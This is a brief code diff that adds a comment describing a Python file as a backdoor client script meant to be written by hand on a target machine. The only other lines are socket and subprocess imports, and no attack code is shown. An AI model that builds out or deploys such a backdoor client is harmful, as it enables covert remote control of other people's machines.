@@ -1,3 +1,5 @@
+# This is a backdoor client script, meant to be portable and easily, manually written on target machine...
+
 import socket
 import subprocess
 
